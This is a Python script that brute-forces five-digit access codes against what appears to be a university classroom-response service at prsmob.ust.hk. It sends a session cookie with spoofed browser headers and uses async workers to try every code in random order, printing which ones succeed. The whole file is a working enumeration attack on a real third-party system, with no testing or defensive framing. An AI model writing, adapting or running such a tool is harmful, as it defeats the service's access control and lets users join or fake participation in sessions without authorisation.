import typing
import asyncio
from asyncio import Queue
import datetime as dt
from functools import wraps
from typing import Union
from httpx import AsyncClient
import httpx
import json

import config

def random_range(start, stop=None, step=None):
    import random, math
    # Set a default values the same way "range" does.
    if (stop == None): start, stop = 0, start
    if (step == None): step = 1
    # Use a mapping to convert a standard range into the desired range.
    mapping = lambda i: (i*step) + start
    # Compute the number of numbers in this range.
    maximum = (stop - start) // step
    # Seed range with a random integer.
    value = random.randint(0,maximum)
    # 
    # Construct an offset, multiplier, and modulus for a linear
    # congruential generator. These generators are cyclic and
    # non-repeating when they maintain the properties:
    # 
    #   1) "modulus" and "offset" are relatively prime.
    #   2) ["multiplier" - 1] is divisible by all prime factors of "modulus".
    #   3) ["multiplier" - 1] is divisible by 4 if "modulus" is divisible by 4.
    # 
    offset = random.randint(0,maximum) * 2 + 1      # Pick a random odd-valued offset.
    multiplier = 4*(maximum//4) + 1                 # Pick a multiplier 1 greater than a multiple of 4.
    modulus = int(2**math.ceil(math.log2(maximum))) # Pick a modulus just big enough to generate all numbers (power of 2).
    # Track how many random numbers have been returned.
    found = 0
    while found < maximum:
        # If this is a valid value, yield it in generator fashion.
        if value < maximum:
            found += 1
            yield mapping(value)
        # Calculate the next value in the sequence.
        value = (value*multiplier + offset) % modulus


# unless you keep a strong reference to a running task, it can be dropped during execution
# https://docs.python.org/3/library/asyncio-task.html#asyncio.create_task
_background_tasks = set()

class RateLimitedClient(AsyncClient):
    """httpx.AsyncClient with a rate limit."""

    def __init__(self, interval: Union[dt.timedelta, float], count=1, **kwargs):
        """
        Parameters
        ----------
        interval : Union[dt.timedelta, float]
            Length of interval.
            If a float is given, seconds are assumed.
        numerator : int, optional
            Number of requests which can be sent in any given interval (default 1).
        """
        if isinstance(interval, dt.timedelta):
            interval = interval.total_seconds()

        self.interval = interval
        self.semaphore = asyncio.Semaphore(count)
        super().__init__(**kwargs)

    def _schedule_semaphore_release(self):
        wait = asyncio.create_task(asyncio.sleep(self.interval))
        _background_tasks.add(wait)

        def wait_cb(task):
            self.semaphore.release()
            _background_tasks.discard(task)

        wait.add_done_callback(wait_cb)

    @wraps(AsyncClient.send)
    async def send(self, *args, **kwargs): #type: ignore
        await self.semaphore.acquire()
        send = asyncio.create_task(super().send(*args, **kwargs))
        self._schedule_semaphore_release()
        return await send


phpsessid = config.PHPSESSID
headers = {
"Host": "prsmob.ust.hk",
"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:131.0) Gecko/20100101 Firefox/131.0",
"Accept": "*/*",
"Accept-Language": "en-US,en;q=0.5",
"Accept-Encoding": "gzip, deflate, br, zstd",
"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
"Origin": "https://prsmob.ust.hk",
"DNT": "1",
"Connection": "keep-alive",
"Referer": "https://prsmob.ust.hk/ars/mobile/home/iLearn?iLearn=true",
"Cookie": f"PHPSESSID={phpsessid}",
"Sec-Fetch-Dest": "empty",
"Sec-Fetch-Mode": "cors",
"Sec-Fetch-Site": "same-origin",
"Sec-GPC": "1",
}

cookies = {"PHPSESSID": phpsessid}
client = httpx.AsyncClient(headers=headers, cookies=cookies)
counter = 0

async def check_session(access_code: str):
    r = await client.post('https://prsmob.ust.hk/ars/mobile/check_session', data={'accessCode': access_code, "type": "check"}, cookies=cookies, headers=headers)
    return (access_code, r)

async def worker(tasks, results):
    global counter
    while True:
        counter += 1
        n = await tasks.get()
        try:
            result = await check_session(n)
            await results.put(result)
        except httpx.ConnectTimeout:
            await asyncio.sleep(10)
            await tasks.put(n)


async def assigner(tasks):
    # come up with tasks dynamically and enqueue them for processing
    for i in list(random_range(10000, 99999)):
        await tasks.put(str(i).zfill(5))

async def displayer(q):
    # show results of the tasks as they arrive
    while True:
        try:
            access_code, r = await q.get()
            result = r.json()
            success = result["success"]
            print(f"Try {counter}, {access_code}: {success}")
        except json.decoder.JSONDecodeError as e:
            print(e)

async def main(pool_size):
    tasks: Queue[int] = asyncio.Queue(100)
    results: Queue[httpx.Response] = asyncio.Queue(100)
    workers = [asyncio.create_task(worker(tasks, results))
               for _ in range(pool_size)]
    await asyncio.gather(assigner(tasks), displayer(results), *workers)


if __name__ == "__main__":
    asyncio.run(main(config.POOL_SIZE))
    asyncio.run(client.aclose())
